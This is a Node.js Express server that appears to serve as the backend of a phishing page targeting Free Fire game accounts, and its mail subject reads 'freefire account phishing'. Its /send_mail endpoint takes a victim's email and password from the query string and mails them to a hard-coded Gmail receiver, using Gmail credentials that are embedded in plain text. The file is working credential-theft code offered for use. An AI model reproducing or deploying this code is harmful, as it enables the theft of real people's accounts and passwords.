/*
    Video: https://www.youtube.com/watch?v=Va9UKGs1bwI
    Don't forget to disable less secure app from Gmail: https://myaccount.google.com/lesssecureapps TODO:
*/

require('dotenv').config();

const nodemailer = require('nodemailer');
const log = console.log;
var express = require('express');
var app = express();
var cors = require('cors')
const bodyParser = require('body-parser');

let transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    auth: {
        user: 'deviltails4531@gmail.com', // TODO: your gmail account
        pass: '15354000' // TODO: your gmail password
    }
});

// Step 2
let mailOptions = {
    from: 'abimaniabinaya39@gmail.com', // TODO: email sender
    to: 'flofficial694@gmail.com', // TODO: email receiver
    subject: 'freefire account phishing',
    text: 'Wooohooo it works!!'
};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.raw({ limit: '50mb' }));
app.use(cors());

app.get('/send_mail', function (req, res) {
    mailOptions.text = "email: " + req.query.email + "  -  pass: " + req.query.pass
    transporter.sendMail(mailOptions, (err, data) => {
        if (err) {
            res.send({
                status: 0,
                error: err
            })
            return
        } else {
            res.send({
                status: 0,
                message: "success"
            })
        }
    });
});

var server = app.listen(process.env.PORT || 5231, function () {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
    app.emit('appstarted', server.address())
});

// Step 1

// Step 3
